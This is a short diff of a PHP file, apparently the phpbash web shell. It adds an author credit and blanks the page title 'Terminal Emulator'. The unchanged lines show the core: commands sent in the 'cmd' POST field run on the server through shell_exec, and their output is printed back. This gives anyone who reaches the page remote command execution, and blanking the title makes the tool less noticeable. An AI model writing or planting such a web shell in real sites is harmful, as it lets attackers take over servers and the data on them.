@@ -1,4 +1,5 @@
 <?php
+/* phpbash by Alexander Reid (Arrexel) */
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
@@ -22,7 +23,7 @@ if (ISSET($_POST['cmd'])) {
 
 <html>
     <head>
-        <title>Terminal Emulator</title>
+        <title></title>
         <style>
             html, body {
                 max-width: 100%;
